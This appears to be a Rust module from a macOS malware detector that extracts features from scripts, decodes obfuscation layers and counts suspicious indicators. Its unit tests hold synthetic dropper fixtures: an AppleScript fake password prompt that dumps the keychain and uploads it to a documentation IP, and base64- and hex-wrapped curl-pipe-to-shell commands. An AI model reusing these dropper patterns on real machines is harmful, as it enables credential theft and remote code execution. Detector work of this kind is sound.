    if has(b"tell application") || has(b"do shell script") || has(b"end tell") {
        return Some(ScriptKind::AppleScript);
    }
    let lines: Vec<&[u8]> = lower.split(|&b| b == b'\n').take(200).collect();
    let starts = |prefixes: &[&[u8]]| {
        lines
            .iter()
            .filter(|l| {
                let t = l.trim_ascii_start();
                prefixes.iter().any(|p| t.starts_with(p))
            })
            .count()
    };
    let py = starts(&[b"import ", b"from ", b"def ", b"class "]);
    let sh = starts(&[
        b"echo ",
        b"export ",
        b"if [",
        b"cd ",
        b"curl ",
        b"chmod ",
        b"osascript",
        b"mkdir ",
        b"rm ",
        b"for ",
        b"while ",
        b"fi",
        b"done",
        b"sudo ",
        b"cat ",
        b"set -",
    ]);
    let js = starts(&[b"var ", b"const ", b"let ", b"function ", b"require("]);
    let pl = starts(&[b"use strict", b"my $", b"use warnings", b"sub "]);
    let best = [
        (sh, ScriptKind::Shell),
        (py, ScriptKind::Python),
        (js, ScriptKind::JavaScript),
        (pl, ScriptKind::Perl),
    ]
    .into_iter()
    .max_by_key(|(n, _)| *n)?;
    (best.0 >= 2).then_some(best.1)
}

/// Detects the script type of `bytes` (head is enough) named `path`. Content sniffing is used only
/// when there is no magic, shebang or known extension. `None` = not a script.
pub fn detect_script_kind(bytes: &[u8], path: Option<&Path>) -> Option<ScriptType> {
    if bytes.starts_with(b"FasdUAS") {
        return Some(ScriptType {
            kind: ScriptKind::AppleScriptCompiled,
            source: KindSource::Magic,
            env: false,
            nonstandard_path: false,
        });
    }
    let text = strip_bom(bytes);
    if let Some(t) = parse_shebang(&text) {
        return Some(t);
    }
    if let Some(kind) = path.and_then(kind_from_extension) {
        return Some(ScriptType {
            kind,
            source: KindSource::Extension,
            env: false,
            nonstandard_path: false,
        });
    }
    sniff_kind(&text).map(|kind| ScriptType {
        kind,
        source: KindSource::Content,
        env: false,
        nonstandard_path: false,
    })
}

/// UTF-8 BOM removed; UTF-16 (BOM) narrowed to ASCII (non-ASCII code units become `?`).
fn strip_bom(bytes: &[u8]) -> std::borrow::Cow<'_, [u8]> {
    if let Some(r) = bytes.strip_prefix(&[0xef, 0xbb, 0xbf]) {
        return std::borrow::Cow::Borrowed(r);
    }
    let be = bytes.starts_with(&[0xfe, 0xff]);
    let le = bytes.starts_with(&[0xff, 0xfe]);
    if be || le {
        let narrowed = bytes[2..]
            .chunks_exact(2)
            .map(|c| {
                let u = if be {
                    u16::from_be_bytes([c[0], c[1]])
                } else {
                    u16::from_le_bytes([c[0], c[1]])
                };
                if u < 0x80 {
                    u as u8
                } else {
                    b'?'
                }
            })
            .collect();
        return std::borrow::Cow::Owned(narrowed);
    }
    std::borrow::Cow::Borrowed(bytes)
}

/// Text view of a compiled AppleScript: ASCII runs (>= 4) and UTF-16BE runs (>= 4 chars), one per
/// line.
fn compiled_applescript_text(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut run: Vec<u8> = Vec::new();
    let flush = |run: &mut Vec<u8>, out: &mut Vec<u8>| {
        if run.len() >= 4 {
            out.extend_from_slice(run);
            out.push(b'\n');
        }
        run.clear();
    };
    for &b in bytes {
        if (0x20..0x7f).contains(&b) || b == b'\t' {
            run.push(b);
        } else {
            flush(&mut run, &mut out);
        }
    }
    flush(&mut run, &mut out);
    for start in 0..2 {
        let mut i = start;
        while i + 1 < bytes.len() {
            let (hi, lo) = (bytes[i], bytes[i + 1]);
            if hi == 0 && ((0x20..0x7f).contains(&lo) || lo == b'\t' || lo == b'\n') {
                run.push(if lo == b'\n' { b' ' } else { lo });
            } else {
                flush(&mut run, &mut out);
            }
            i += 2;
        }
        flush(&mut run, &mut out);
    }
    out
}

// ------------------------------------------------------------------------------------------------
// De-obfuscation
// ------------------------------------------------------------------------------------------------

fn b64_value(b: u8) -> Option<u8> {
    Some(match b {
        b'A'..=b'Z' => b - b'A',
        b'a'..=b'z' => b - b'a' + 26,
        b'0'..=b'9' => b - b'0' + 52,
        b'+' | b'-' => 62,
        b'/' | b'_' => 63,
        _ => return None,
    })
}

/// Lenient base64 decoder (standard or URL-safe alphabet, padding optional).
pub(crate) fn decode_base64(s: &[u8], max: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity((s.len() / 4 * 3).min(max));
    let (mut acc, mut bits) = (0u32, 0u32);
    for &c in s {
        if c == b'=' {
            break;
        }
        let Some(v) = b64_value(c) else { continue };
        acc = (acc << 6) | u32::from(v);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
            if out.len() >= max {
                break;
            }
        }
    }
    out
}

fn decode_hex(s: &[u8], max: usize) -> Vec<u8> {
    let nib = |b: u8| (b as char).to_digit(16).map(|d| d as u8);
    s.chunks_exact(2)
        .take(max)
        .filter_map(|c| Some((nib(c[0])? << 4) | nib(c[1])?))
        .collect()
}

fn mostly_printable(d: &[u8]) -> bool {
    d.len() >= 8
        && d.iter()
            .filter(|&&b| (0x20..0x7f).contains(&b) || matches!(b, b'\t' | b'\n' | b'\r'))
            .count()
            * 100
            >= d.len() * 85
}

/// Decodes base64 / hex blobs and `\xNN` escape runs of `text` that yield mostly printable text.
fn decode_layer(text: &[u8], budget: &mut usize) -> Vec<u8> {
    let mut out = Vec::new();
    let push = |d: Vec<u8>, out: &mut Vec<u8>, budget: &mut usize| {
        if mostly_printable(&d) && *budget > 0 {
            let take = d.len().min(*budget);
            out.extend_from_slice(&d[..take]);
            out.push(b'\n');
            *budget -= take;
        }
    };
    // base64 / hex runs
    let mut i = 0;
    while i < text.len() && *budget > 0 {
        if b64_value(text[i]).is_some() {
            let start = i;
            while i < text.len() && (b64_value(text[i]).is_some() || text[i] == b'=') {
                i += 1;
            }
            let run = &text[start..i];
            if run.len() >= MIN_SCRIPT_BLOB {
                let hex = run.iter().all(u8::is_ascii_hexdigit);
                let d = if hex {
                    decode_hex(run, *budget)
                } else {
                    decode_base64(run, *budget)
                };
                push(d, &mut out, budget);
            }
        } else {
            i += 1;
        }
    }
    // \xNN escape runs
    let mut i = 0;
    while i + 3 < text.len() && *budget > 0 {
        if text[i] == b'\\' && (text[i + 1] == b'x' || text[i + 1] == b'X') {
            let mut d = Vec::new();
            let mut j = i;
            while j + 4 <= text.len()
                && text.get(j) == Some(&b'\\')
                && matches!(text.get(j + 1), Some(b'x' | b'X'))
            {
                match (
                    text.get(j + 2).and_then(|b| (*b as char).to_digit(16)),
                    text.get(j + 3).and_then(|b| (*b as char).to_digit(16)),
                ) {
                    (Some(h), Some(l)) => d.push((h * 16 + l) as u8),
                    _ => break,
                }
                j += 4;
            }
            if d.len() >= 8 {
                push(d, &mut out, budget);
            }
            i = j.max(i + 1);
        } else {
            i += 1;
        }
    }
    out
}

// ------------------------------------------------------------------------------------------------
// Extraction
// ------------------------------------------------------------------------------------------------

fn entropy(bytes: &[u8]) -> f32 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut hist = [0u64; 256];
    for &b in bytes {
        hist[b as usize] += 1;
    }
    let t = bytes.len() as f64;
    let mut h = 0.0f64;
    for &c in hist.iter().filter(|&&c| c > 0) {
        let p = c as f64 / t;
        h -= p * p.log2();
    }
    h as f32
}

fn fnv1a(parts: &[&[u8]]) -> u64 {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            h ^= 0x20;
            h = h.wrapping_mul(0x0100_0000_01b3);
        }
        for &b in *p {
            h ^= u64::from(b);
            h = h.wrapping_mul(0x0100_0000_01b3);
        }
    }
    h
}

fn is_token_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'$')
}

fn trim_token(t: &[u8]) -> &[u8] {
    let edge = |b: &u8| *b == b'.' || *b == b'-';
    let start = t.iter().position(|b| !edge(b)).unwrap_or(t.len());
    let end = t.iter().rposition(|b| !edge(b)).map_or(start, |e| e + 1);
    &t[start..end.max(start)]
}

/// Normalised token: lower-cased; digit-only tokens become `<num>`, long ones `<long>`.
fn normalise_token(t: &[u8]) -> Vec<u8> {
    if t.iter().all(u8::is_ascii_digit) {
        return b"<num>".to_vec();
    }
    if t.len() > MAX_TOKEN_LEN {
        return b"<long>".to_vec();
    }
    t.to_ascii_lowercase()
}

struct TokenStats {
    total: u64,
    distinct: usize,
    max_len: usize,
    sum_len: u64,
    buckets: Vec<u64>,
}

fn token_features(texts: &[&[u8]]) -> TokenStats {
    let mut st = TokenStats {
        total: 0,
        distinct: 0,
        max_len: 0,
        sum_len: 0,
        buckets: vec![0; HASH_BUCKETS],
    };
    let mut seen: HashSet<u64> = HashSet::new();
    let mut prev: Option<Vec<u8>> = None;
    'outer: for text in texts {
        for raw in text.split(|b| !is_token_byte(*b)) {
            let raw = trim_token(raw);
            if raw.is_empty() {
                continue;
            }
            if st.total as usize >= MAX_TOKENS {
                break 'outer;
            }
            st.total += 1;
            st.max_len = st.max_len.max(raw.len());
            st.sum_len += raw.len() as u64;
            let tok = normalise_token(raw);
            let h1 = fnv1a(&[b"u", &tok]);
            if seen.len() < MAX_DISTINCT {
                seen.insert(h1);
            }
            st.buckets[(h1 % HASH_BUCKETS as u64) as usize] += 1;
            if let Some(p) = &prev {
                let h2 = fnv1a(&[b"b", p, &tok]);
                st.buckets[(h2 % HASH_BUCKETS as u64) as usize] += 1;
            }
            prev = Some(tok);
        }
        prev = None;
    }
    st.distinct = seen.len();
    st
}

fn count_escapes(text: &[u8]) -> (u64, u64, u64, u64) {
    let (mut hex, mut oct, mut uni, mut pct) = (0u64, 0u64, 0u64, 0u64);
    let hexd = |b: Option<&u8>| b.is_some_and(u8::is_ascii_hexdigit);
    let octd = |b: Option<&u8>| b.is_some_and(|c| (b'0'..=b'7').contains(c));
    for i in 0..text.len() {
        match text[i] {
            b'\\' => match text.get(i + 1) {
                Some(b'x' | b'X') if hexd(text.get(i + 2)) && hexd(text.get(i + 3)) => hex += 1,
                Some(b'u') if (2..6).all(|k| hexd(text.get(i + k))) => uni += 1,
                Some(_) if (1..4).all(|k| octd(text.get(i + k))) => oct += 1,
                _ => {}
            },
            b'%' if hexd(text.get(i + 1)) && hexd(text.get(i + 2)) => pct += 1,
            _ => {}
        }
    }
    (hex, oct, uni, pct)
}

/// Extracts the script feature vector. `path` (file name) helps type detection; `Err(NotScript)`
/// when the content is not recognised as a script. Never panics (parser under `catch_unwind`).
pub fn extract_script_features(bytes: &[u8], path: Option<&Path>) -> Result<Vec<f32>, MlError> {
    let bytes = &bytes[..bytes.len().min(MAX_SCRIPT_BYTES)];
    let ty = detect_script_kind(bytes, path).ok_or(MlError::NotScript)?;
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| extract_inner(bytes, &ty))) {
        Ok(v) => Ok(v),
        Err(_) => Err(MlError::Malformed("script parser panicked".into())),
    }
}

fn extract_inner(bytes: &[u8], ty: &ScriptType) -> Vec<f32> {
    let mut v = Sv(vec![0.0; N_BASE + HASH_BUCKETS]);
    for k in ScriptKind::ALL {
        v.flag(kind_feature(k), ty.kind == k);
    }
    v.flag(S::KindFromSniff, ty.source == KindSource::Content);
    v.flag(S::ShebangEnv, ty.env);
    v.flag(
        S::ShebangNonstd,
        ty.source == KindSource::Shebang && ty.nonstandard_path,
    );
    let utf16 = bytes.starts_with(&[0xfe, 0xff]) || bytes.starts_with(&[0xff, 0xfe]);
    v.flag(S::IsUtf16, utf16);

    let text: std::borrow::Cow<'_, [u8]> = if ty.kind == ScriptKind::AppleScriptCompiled {
        std::borrow::Cow::Owned(compiled_applescript_text(bytes))
    } else {
        strip_bom(bytes)
    };
    let text: &[u8] = &text;

    lexical(&mut v, text, ty.kind);

    // De-obfuscation layers.
    let mut budget = MAX_DECODED_BYTES;
    let layer1 = decode_layer(text, &mut budget);
    let layer2 = if layer1.is_empty() {
        Vec::new()
    } else {
        decode_layer(&layer1, &mut budget)
    };
    let depth = if !layer2.is_empty() {
        2
    } else if !layer1.is_empty() {
        1
    } else {
        0
    };
    v.count(S::DecodedLayers, depth);
    v.log2(S::DecodedLog2, (layer1.len() + layer2.len()) as u64);

    // Structural strings over text + layers.
    let views: [&[u8]; 3] = [text, &layer1, &layer2];
    let mut st = StructStats::default();
    for t in views {
        script_blobs(&mut st, t);
    }
    v.count(S::B64Blobs, st.b64_blobs);
    v.log2(S::B64MaxLog2, st.b64_max as u64);
    v.count(S::HexBlobs, st.hex_blobs);
    v.count(S::Ipv4, st.ipv4);

    // Indicators + URLs.
    if let Some(ac) = indicator_automaton() {
        let mut counts = vec![0u64; N_BASE];
        let mut decoded_hits = 0u64;
        let mut hosts: BTreeSet<Vec<u8>> = BTreeSet::new();
        let (mut url_ip, mut url_port) = (0u64, 0u64);
        for (layer, t) in views.iter().enumerate() {
            for m in ac.find_overlapping_iter(*t) {
                if let Some((_, f)) = INDICATORS.get(m.pattern().as_usize()) {
                    counts[*f as usize] += 1;
                    if layer > 0 {
                        decoded_hits += 1;
                    }
                }
            }
            for (pos, _) in t.windows(3).enumerate().filter(|(_, w)| *w == b"://") {
                let before = &t[pos.saturating_sub(5)..pos];
                let before = before.to_ascii_lowercase();
                let scheme_ok = before.ends_with(b"http") || before.ends_with(b"https");
                if !scheme_ok {
                    continue;
                }
                let (host, port) = url_host(&t[pos + 3..]);
                if host.is_empty() {
                    continue;
                }
                if is_ipv4(host) {
                    url_ip += 1;
                }
                if port.is_some_and(|p| p != b"80" && p != b"443") {
                    url_port += 1;
                }
                if hosts.len() < 1000 {
                    hosts.insert(host.to_ascii_lowercase());
                }
            }
        }
        for (i, n) in counts.into_iter().enumerate() {
            if n > 0 {
                v.0[i] = n.min(100_000) as f32;
            }
        }
        v.count(S::DecodedHits, decoded_hits);
        v.count(S::UrlHosts, hosts.len() as u64);
        v.count(S::UrlIp, url_ip);
        v.count(S::UrlNonstdPort, url_port);
    }

    // Tokens (text + layers).
    let tok = token_features(&views);
    v.log2(S::TokensLog2, tok.total);
    v.log2(S::DistinctTokensLog2, tok.distinct as u64);
    v.ratio(S::DistinctRatio, tok.distinct as u64, tok.total);
    v.log2(S::MaxTokenLog2, tok.max_len as u64);
    v.ratio(S::AvgTokenLen, tok.sum_len, tok.total);
    for (i, n) in tok.buckets.iter().enumerate() {
        v.0[N_BASE + i] = lg(*n);
    }
    v.0
}

/// Script blob thresholds are shorter than the Mach-O ones (40 vs 64).
fn script_blobs(st: &mut StructStats, t: &[u8]) {
    let mut local = StructStats::default();
    local.scan_with_min(t, MIN_SCRIPT_BLOB);
    st.b64_blobs += local.b64_blobs;
    st.b64_max = st.b64_max.max(local.b64_max);
    st.hex_blobs += local.hex_blobs;
    st.ipv4 += local.ipv4;
}

fn kind_feature(k: ScriptKind) -> S {
    match k {
        ScriptKind::Shell => S::KindShell,
        ScriptKind::Bash => S::KindBash,
        ScriptKind::Zsh => S::KindZsh,
        ScriptKind::AppleScript => S::KindAppleScript,
        ScriptKind::AppleScriptCompiled => S::KindAppleScriptCompiled,
        ScriptKind::Jxa => S::KindJxa,
        ScriptKind::JavaScript => S::KindJavaScript,
        ScriptKind::Python => S::KindPython,
        ScriptKind::Perl => S::KindPerl,
        ScriptKind::Ruby => S::KindRuby,
        ScriptKind::Other => S::KindOther,
    }
}

fn lexical(v: &mut Sv, text: &[u8], kind: ScriptKind) {
    let n = text.len() as u64;
    v.log2(S::SizeLog2, n);
    v.set(S::Entropy, entropy(text));
    let (mut non_ascii, mut control, mut ws, mut alpha, mut digit, mut punct, mut upper) =
        (0u64, 0u64, 0u64, 0u64, 0u64, 0u64, 0u64);
    for &b in text {
        match b {
            0x80..=0xff => non_ascii += 1,
            b'\t' | b'\n' | b'\r' | b' ' => ws += 1,
            0x00..=0x1f | 0x7f => control += 1,
            b'a'..=b'z' => alpha += 1,
            b'A'..=b'Z' => {
                alpha += 1;
                upper += 1
            }
            b'0'..=b'9' => digit += 1,
            _ => punct += 1,
        }
    }
    v.ratio(S::NonAsciiRatio, non_ascii, n);
    v.ratio(S::ControlRatio, control, n);
    v.ratio(S::WhitespaceRatio, ws, n);
    v.ratio(S::AlphaRatio, alpha, n);
    v.ratio(S::DigitRatio, digit, n);
    v.ratio(S::PunctRatio, punct, n);
    v.ratio(S::UpperRatio, upper, alpha);

    let (mut lines, mut long, mut blank, mut comments, mut max_line) =
        (0u64, 0u64, 0u64, 0u64, 0usize);
    let prefixes = kind.comment_prefixes();
    for line in text.split(|&b| b == b'\n') {
        lines += 1;
        max_line = max_line.max(line.len());
        if line.len() > 500 {
            long += 1;
        }
        let t = line.trim_ascii();
        if t.is_empty() {
            blank += 1;
        } else if !t.starts_with(b"#!") && prefixes.iter().any(|p| t.starts_with(p.as_bytes())) {
            comments += 1;
        }
    }
    v.log2(S::LinesLog2, lines);
    v.ratio(S::AvgLineLen, n, lines);
    v.log2(S::MaxLineLog2, max_line as u64);
    v.ratio(S::LongLineRatio, long, lines);
    v.ratio(S::BlankLineRatio, blank, lines);
    v.ratio(S::CommentLineRatio, comments, lines.saturating_sub(blank));

    let occ = |needle: &[u8]| text.windows(needle.len()).filter(|w| *w == needle).count() as u64;
    v.log2(S::DollarBrace, occ(b"${"));
    v.log2(
        S::CmdSubst,
        occ(b"$(") + text.iter().filter(|&&b| b == b'`').count() as u64,
    );
    v.log2(S::Pipes, text.iter().filter(|&&b| b == b'|').count() as u64);
    v.ratio(
        S::Semicolons,
        text.iter().filter(|&&b| b == b';').count() as u64,
        lines,
    );
    v.count(S::Heredocs, occ(b"<<"));
    let (hex, oct, uni, pct) = count_escapes(text);
    v.log2(S::HexEscapes, hex);
    v.log2(S::OctalEscapes, oct);
    v.log2(S::UnicodeEscapes, uni);
    v.log2(S::PercentEscapes, pct);
}

#[cfg(test)]
pub(crate) fn script_index_of(name: &str) -> usize {
    script_feature_names()
        .iter()
        .position(|n| *n == name)
        .expect("unknown script feature")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn get(v: &[f32], name: &str) -> f32 {
        v[script_index_of(name)]
    }

    fn feats(src: &str, name: &str) -> Vec<f32> {
        extract_script_features(src.as_bytes(), Some(Path::new(name))).unwrap()
    }

    #[test]
    fn layout_is_consistent() {
        let names = script_feature_names();
        assert_eq!(names.len(), script_feature_descriptions().len());
        assert_eq!(names.len(), N_BASE + HASH_BUCKETS);
        let set: BTreeSet<_> = names.iter().collect();
        assert_eq!(set.len(), names.len(), "duplicate feature names");
        assert!(names.iter().all(|n| n
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_')));
        assert_eq!(S::ISetUmaskHidden as usize, N_BASE - 1);
        // Patterns are matched case-insensitively: keep them lower-case so the table reads as such.
        assert!(INDICATORS.iter().all(|(p, _)| p.to_ascii_lowercase() == *p));
    }

    #[test]
    fn detects_kinds() {
        let k = |src: &[u8], p: &str| detect_script_kind(src, Some(Path::new(p))).map(|t| t.kind);
        assert_eq!(k(b"#!/bin/sh\necho hi\n", "x"), Some(ScriptKind::Shell));
        assert_eq!(k(b"#!/bin/bash\n", "x"), Some(ScriptKind::Bash));
        assert_eq!(k(b"#!/usr/bin/env zsh\n", "x"), Some(ScriptKind::Zsh));
        assert_eq!(
            k(b"#!/usr/bin/env -S python3 -u\n", "x"),
            Some(ScriptKind::Python)
        );
        assert_eq!(k(b"#!/usr/bin/perl -w\n", "x"), Some(ScriptKind::Perl));
        assert_eq!(
            k(b"#!/usr/bin/osascript -l JavaScript\n", "x"),
            Some(ScriptKind::Jxa)
        );
        assert_eq!(
            k(b"#!/usr/bin/osascript\n", "x"),
            Some(ScriptKind::AppleScript)
        );
        assert_eq!(
            k(b"FasdUAS 1.101.10\x0e\x00\x00", "x.scpt"),
            Some(ScriptKind::AppleScriptCompiled)
        );
        assert_eq!(k(b"echo hi", "run.command"), Some(ScriptKind::Shell));
        assert_eq!(k(b"print(1)", "a.py"), Some(ScriptKind::Python));
        assert_eq!(
            k(b"tell application \"Finder\"\nend tell\n", "noext"),
            Some(ScriptKind::AppleScript)
        );
        assert_eq!(
            k(b"echo start\ncd /tmp\ncurl -o a b\n", "noext"),
            Some(ScriptKind::Shell)
        );
        assert_eq!(k(b"hello world, plain prose", "notes.txt"), None);
        assert_eq!(k(&[0u8, 1, 2, 3, 0xff], "blob"), None);
        let t = detect_script_kind(b"#!/tmp/.x/python\n", None).unwrap();
        assert!(t.nonstandard_path && !t.env);
        let t = detect_script_kind(b"#!/usr/bin/env bash\n", None).unwrap();
        assert!(t.env && !t.nonstandard_path);
    }

    // ---- Synthetic fixtures -----------------------------------------------------------------
    // The "suspicious" scripts below are TEST STRINGS written for this test suite: they imitate
    // the *shape* of macOS infostealer droppers (AMOS-style password prompt, curl | bash,
    // base64 layers, keychain access) but point at reserved documentation addresses
    // (RFC 5737 / example.invalid) and do nothing harmful. They are never executed.

    /// TEST STRING (benign but suspicious-looking): AMOS-like AppleScript password phishing.
    const FAKE_PROMPT: &str = r#"#!/usr/bin/osascript
-- TEST FIXTURE, not real malware
set pw to text returned of (display dialog "To launch the application, you need to update the system settings. Please enter your password." default answer "" with hidden answer)
do shell script "dscl . -authonly " & (short user name of (system info)) & " " & pw
do shell script "security find-generic-password -ga 'Chrome' > /tmp/.test-fixture"
do shell script "ditto -c -k --sequesterRsrc /tmp/.test-fixture /tmp/out.zip; curl -F file=@/tmp/out.zip http://192.0.2.1:8080/upload"
"#;

    /// TEST STRING (benign but suspicious-looking): base64-wrapped curl | bash dropper.
    fn fake_dropper() -> String {
        let inner =
            "curl -s http://198.51.100.9/test-fixture.sh | bash; xattr -c /tmp/x; chmod +x /tmp/x";
        format!(
            "#!/bin/zsh\n# TEST FIXTURE\necho '{}' | base64 -d | zsh\n",
            encode_b64(inner.as_bytes())
        )
    }

    fn encode_b64(d: &[u8]) -> String {
        const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for c in d.chunks(3) {
            let n = (u32::from(c[0]) << 16)
                | (u32::from(*c.get(1).unwrap_or(&0)) << 8)
                | u32::from(*c.get(2).unwrap_or(&0));
            for i in 0..4 {
                if i <= c.len() {
                    s.push(A[((n >> (18 - 6 * i)) & 63) as usize] as char);
                } else {
                    s.push('=');
                }
            }
        }
        s
    }

    /// Benign: a Homebrew-style installer fragment and a dotfiles `.macos` fragment.
    const BENIGN: &str = r#"#!/bin/bash
# Install helper (fixture). Copies a tool and configures defaults.
set -euo pipefail
PREFIX="${PREFIX:-/opt/homebrew}"
echo "Installing into ${PREFIX}"
mkdir -p "${PREFIX}/bin"
cp ./tool "${PREFIX}/bin/tool"
defaults write com.apple.finder AppleShowAllFiles -bool true
killall Finder
"#;

    #[test]
    fn suspicious_prompt_features() {
        let v = feats(FAKE_PROMPT, "x.applescript");
        assert_eq!(get(&v, "kind_applescript"), 1.0);
        assert!(get(&v, "ind_dialog") >= 1.0);
        assert!(get(&v, "ind_hidden_answer") >= 2.0);
        assert!(get(&v, "ind_password_prompt") >= 2.0);
        assert!(get(&v, "ind_dscl_authonly") >= 2.0);
        assert!(get(&v, "ind_keychain") >= 1.0);
        assert!(get(&v, "ind_archive") >= 1.0);
        assert!(get(&v, "ind_upload") >= 1.0);
        assert!(get(&v, "ind_hidden_tmp_path") >= 1.0);
        assert!(get(&v, "ind_applescript_ui") >= 3.0);
        assert_eq!(get(&v, "url_ip"), 1.0);
        assert_eq!(get(&v, "url_nonstd_port"), 1.0);
        assert!(get(&v, "comment_line_ratio") > 0.0);
    }

    #[test]
    fn decodes_base64_layer() {
        let src = fake_dropper();
        let v = feats(&src, "x");
        assert_eq!(get(&v, "kind_zsh"), 1.0);
        assert_eq!(get(&v, "decoded_layers"), 1.0);
        assert!(get(&v, "decoded_bytes_log2") > 5.0);
        assert!(get(&v, "decoded_indicator_hits") >= 4.0);
        assert!(get(&v, "ind_decode") >= 1.0);
        assert!(get(&v, "ind_pipe_to_interpreter") >= 2.0); // "| zsh" raw + "| bash" decoded
        assert!(get(&v, "ind_quarantine_removal") >= 1.0);
        assert!(get(&v, "ind_chmod_exec") >= 1.0);
        assert_eq!(get(&v, "url_ip"), 1.0);
        assert_eq!(get(&v, "b64_blobs"), 1.0);
    }

    #[test]
    fn benign_installer_features() {
        let v = feats(BENIGN, "install.sh");
        assert_eq!(get(&v, "kind_bash"), 1.0);
        assert_eq!(get(&v, "decoded_layers"), 0.0);
        assert_eq!(get(&v, "ind_keychain"), 0.0);
        assert_eq!(get(&v, "ind_dialog"), 0.0);
        assert_eq!(get(&v, "ind_defaults_write"), 1.0);
        assert_eq!(get(&v, "ind_kill"), 1.0);
        assert!(get(&v, "dollar_brace_log2") > 1.0);
        let toks: f32 = (0..HASH_BUCKETS).map(|i| v[N_BASE + i]).sum();
        assert!(toks > 0.0);
    }

    #[test]
    fn compiled_applescript_strings_are_seen() {
        let mut scpt = b"FasdUAS 1.101.10\x0e\x00\x00\x00\x04\x0f\xff\xff".to_vec();
        // UTF-16BE literal, as stored by the AppleScript compiler.
        for c in "do shell script \"curl -s http://192.0.2.7/x | sh\"".encode_utf16() {
            scpt.extend_from_slice(&c.to_be_bytes());
        }
        scpt.extend_from_slice(b"\x00\x00\x01\x02");
        let v = extract_script_features(&scpt, Some(Path::new("a.scpt"))).unwrap();
        assert_eq!(get(&v, "kind_applescript_compiled"), 1.0);
        assert!(get(&v, "ind_applescript_ui") >= 1.0);
        assert!(get(&v, "ind_pipe_to_interpreter") >= 1.0);
        assert_eq!(get(&v, "url_ip"), 1.0);
    }

    #[test]
    fn escapes_and_utf16() {
        let src = "#!/usr/bin/env python3\nexec(\"\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73\\x3b\\x6f\\x73\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x69\\x64\\x27\\x29\")\n";
        let v = feats(src, "x.py");
        assert_eq!(get(&v, "kind_python"), 1.0);
        assert!(get(&v, "hex_escapes_log2") > 4.0);
        assert_eq!(get(&v, "decoded_layers"), 1.0);
        assert!(get(&v, "ind_python_risky") >= 1.0); // os.system in the decoded layer
        let mut u16 = vec![0xff, 0xfe];
        for c in "#!/bin/sh\necho hi\n".encode_utf16() {
            u16.extend_from_slice(&c.to_le_bytes());
        }
        let v = extract_script_features(&u16, None).unwrap();
        assert_eq!(get(&v, "is_utf16"), 1.0);
        assert_eq!(get(&v, "kind_shell"), 1.0);
    }

    #[test]
    fn deterministic_robust_and_bounded() {
        let src = fake_dropper();
        assert_eq!(feats(&src, "a.sh"), feats(&src, "a.sh"));
        assert!(matches!(
            extract_script_features(b"\x00\x01binary", Some(Path::new("x.bin"))),
            Err(MlError::NotScript)
        ));
        // Arbitrary bytes under a script extension never panic and stay finite.
        let mut state = 0x9e37_79b9u32;
        for len in [0usize, 1, 3, 17, 300, 5000] {
            let mut b = Vec::with_capacity(len);
            for _ in 0..len {
                state ^= state << 13;
                state ^= state >> 17;
                state ^= state << 5;
                b.push(state as u8);
            }
            let v = extract_script_features(&b, Some(Path::new("r.sh"))).unwrap();
            assert_eq!(v.len(), script_feature_names().len());
            assert!(v.iter().all(|x| x.is_finite()));
        }
        // A huge base64 blob decodes within the budget.
        let big = format!("#!/bin/sh\necho {}\n", "QUJD".repeat(600_000));
        let v = feats(&big, "x.sh");
        assert!(get(&v, "decoded_bytes_log2") <= lg(MAX_DECODED_BYTES as u64 + 4096));
    }

    #[test]
    fn base64_decoder() {
        assert_eq!(decode_base64(b"aGVsbG8gd29ybGQ=", 100), b"hello world");
        assert_eq!(decode_base64(b"aGVsbG8", 100), b"hello");
        assert_eq!(decode_hex(b"68656c6c6f", 100), b"hello");
    }
}
